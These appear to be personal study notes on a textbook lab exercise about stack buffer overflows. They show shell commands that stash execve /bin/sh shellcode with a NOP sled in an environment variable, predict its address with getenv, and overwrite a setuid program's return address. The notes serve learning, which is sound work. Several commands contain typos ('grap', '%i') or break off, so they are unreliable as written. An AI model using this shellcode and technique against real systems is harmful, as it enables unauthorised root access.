# 0x331 Using the Environments

# Sometimes a buffer will be too small to hold even shellcode.
# Fortunately, there are other locationbs in memory where shellcode can be stashed.

# Environment variables are used bu the user shell for a variety of things, but
# what they are used for isn't as important as the fact they are located on the
# stack and can be set from the shell.

# Below example sets an environment variable called `myvar` to the string `test`.
$ export myvar=test
$ echo $myvar
#test

$ env
#TERM_PROGRAM=iTerm.app
#TERM=xterm-256color
#SHELL=/bin/bash
#CLICOLOR=1
#TMPDIR=/var/folders/1f/q3hscfgs5pg61k615prfh5dm0000gn/T/
#
#   ( ... )
# myvar=test
#
#   ( ... )

# Similarly, the shellcode can be put in an environment variable, but first
# it needs to be in a form we can easily manipulate.
$ head 04_exploit_notesearch.c
##include <stdio.h>
##include <stdlib.h>
##include <string.h>
#
#char shellcode[] =
#"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68" "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89" "\xe1\xcd\x80";
#
#int main(int argc, char *argv[]) {
#  unsigned int i, *ptr, ret, offset=270;
#  char *command, *buffer;

$ head 04_exploit_notesearch.c | grep "^\""
#"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68" "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89" "\xe1\xcd\x80";

# BASH's for loop can actually be used to send each of these lines to an `echo` 
# command, with command-line options to recognize hex expansion and to suppress
# adding a newline character to the end.

$ for i in $(head 04_exploit_notesearch.c | grap "^\"" | cut -d\" -f2)
> do
> echo -en %i
> done > shellcode.bin

$ hexdump -C shellcode.bin
#00000000  31 c0 31 db 31 c9 99 b0  a4 cd 80 6a 0b 58 51 68  |1.1.1......j.XQh|
#00000010


# Now, we have the shellcode in a file called shellcode.bin.
# This can be used with command substitution to put shellcode into an environment
# variable, along with a generous NOP sled.

$ export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat shellcode.bin)
$ echo $SHELLCODE
#��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��̀j
#                     XQh


# In C's standard library, there is a function called `getenv()`, which accepts the
# name of an environment variable as its only argument and returns that variable's
# memory address.

$ gcc 05_getenv_example.c
$./a.out SHELLCODE
# SHELLCODE is at 0x7ffeeeaf26ab

# In order to be able to predict an exact memory address, the differences in the
# addresses must be explored.

# The length of the name of the program being executed seems to have an effect on
# the address of the environment variables.

# This type of experimentation and pattern recognition is an important skill for 
# a hacker to have.

$ cp a.out a
$ ./a SHELLCODE
# SHELLCODE is at 0x7ffeeb2b9687
$ cp a.out bb
$ ./bb SHELLCODE
# SHELLCODE is at 0x7ffee0ea6680
$ cp a.out ccc
$ ./ccc SHELLCODE
# SHELLCODE is at 0x7ffeef44a681

# Because i'm using many processes in my Labtop, the difference of the address is not
# 8 bytes...


# Armed with this knowledge, the exact address of the environment variable can be
# predicted when the vulnerable program is executed.

# Below program adjusts the address based on the difference in program name length 
# to provide a very accurate prediction (page 147).

# Below example adjusts the address based on the difference in program name length 
# to provide a very accurate prediction (page 147).
$ gcc -o 06_getenvaddr 06_getenvaddr.c
$ ./06_getenvaddr SLEDLESS ./notesearch
# SLEDLESS is at 0x7ffeeb779e9b

$ sudo ./notesearch $(perl -e 'print "\x3c\xff\xff\xbf"x10')
# [DEBUG] found a 24 byte note for user id 0
# -------[ end of note data ]-------
